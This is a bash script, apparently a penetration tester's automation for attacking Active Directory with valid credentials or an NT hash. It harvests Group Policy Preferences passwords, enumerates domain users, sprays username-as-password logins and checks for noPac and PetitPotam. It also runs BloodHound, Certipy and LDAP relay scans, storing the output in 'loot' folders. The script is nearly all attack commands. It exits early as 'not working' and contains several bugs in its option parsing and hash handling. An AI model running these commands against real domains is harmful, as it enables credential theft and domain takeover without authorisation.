 #!/bin/bash
figlet -w 84 ProSecUserChecks
echo "pre Alpha - not working"
exit 0
usage="
HINT: Special Characters should be escaped better use ''
DNS must be working for bloodhound!

Options:
  -u              Username -> Required
  -p              Password -> provide pass OR nthash
  -H              NT Hash -> provide pass OR nthash
  -d              domain -> required
  -ip             IP Domain Controller -> required
  -h              this help
"

while getopts u:p:H:d:ip:h: flag
do
    case "${flag}" in
        h)
           echo "$usage"
        u) USER=${OPTARG};;
        p) PASS=${OPTARG};;
        H) HASH=${OPTARG};;
        d) DOM=${OPTARG};;
        ip) IP=${OPTARG};;
    esac
done

if [ -z $USER ] || [ -z $IP ] || [ -z $DOM ]
then 
    echo "$usage"
    exit 1
fi

if [ -z $PASS ] && [ -z $HASH ]
then
    echo "$usage"
    exit 1
fi

# get DC_FQDN
FQDN=$(nslookup $IP | awk '// {print$4}' | sed 's/.$//')

if [ -z $HASH ]
then
 # Use Password
 # GPP password
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_password | tee -a /root/output/loot/intern/ad/gpp_password/$IP_pass.txt

 # GPP autologin
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M gpp_autologin | tee -a /root/output/loot/intern/ad/gpp_autologin/$IP_login.txt

 # User txt from DC
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --users > /root/output/list/raw.txt
    awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
    rm /root/output/list/raw.txt
    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success > /root/output/loot/intern/ad/name_as_pass/raw.txt
    grep '+' /root/output/loot/intern/ad/name_as_pass/raw.txt > /root/output/loot/intern/ad/name_as_pass/user.txt
 # keep the raw file for screens and debugging

 # Password policy
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --pass-pol | tee -a /root/output/loot/intern/ad/passpol/$DOM_pol.txt

 # nopac
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M nopac | tee -a /root/output/loot/intern/ldap/nopac/$IP.txt

 # petitpotam
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM -M petitpotam | tee -a /root/output/loot/intern/rpc/petit_potam

 # sessions
    crackmapexec smb $IP -u $USER -p $PASS -d $DOM --sessions | tee -a /root/output/loot/intern/ad/session/$IP_sessions.txt

 # ldap signing 
    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -p $PASS -dc-ip $IP -method BOTH > /root/output/loot/intern/ldap/signing/signig.txt

 # bloodhound
    bloodhound-python -u $USER -p $PASS -d $DOM -dc $FQDN -w 50 -c all --zip
    certipy find -u $USER -p $PASS -target $IP -old-bloodhound
    mv *.zip /root/output/loot/intern/ad
fi

if [ -z $PASS ]
then
 # use HASH
 # GPP password
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_password | tee -a /root/output/loot/intern/ad/gpp_password/$IP_pass.txt

 # GPP autologin
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M gpp_autologin | tee -a /root/output/loot/intern/ad/gpp_autologin/$IP_login.txt

 # User txt from DC
    crackmapexec smb $IP -u $USER -H $HASH-d $DOM --users > /root/output/list/raw.txt
    awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | sed '/\x1b\[[0-9;]*[mGKHF]/d' | grep -v 'HealthMailbox' > /root/output/list/user.txt
    rm /root/output/list/raw.txt
    crackmapexec smb $IP -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success > /root/output/loot/intern/ad/name_as_pass/raw.txt
    grep '+' /root/output/loot/intern/ad/name_as_pass/raw.txt > /root/output/loot/intern/ad/name_as_pass/user.txt
 # keep the raw file for screens and debugging

 # Password policy
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM --pass-pol | tee -a /root/output/loot/intern/ad/passpol/$DOM_pol.txt

 # nopac
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M nopac | tee -a /root/output/loot/intern/ldap/nopac/$IP.txt

 # petitpotam
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM -M petitpotam | tee -a /root/output/loot/intern/rpc/petit_potam

 # sessions
    crackmapexec smb $IP -u $USER -H $HASH -d $DOM --sessions | tee -a /root/output/loot/intern/ad/session/$IP_sessions.txt

 # ldap signing
    python3 /opt/LdapRelayScan/LdapRelayScan.py -u $USER -nthash $HASH -dc-ip $IP -method BOTH > /root/output/loot/intern/ldap/signing/signig.txt

 # bloodhound
    bloodhound-python -u $USER -p $PASS -d $DOM -dc $FQDN -w 50 -c all --zip
    certipy find -u $USER -hashes $HASH -target $IP -old-bloodhound
    mv *.zip /root/output/loot/intern/ad
fi
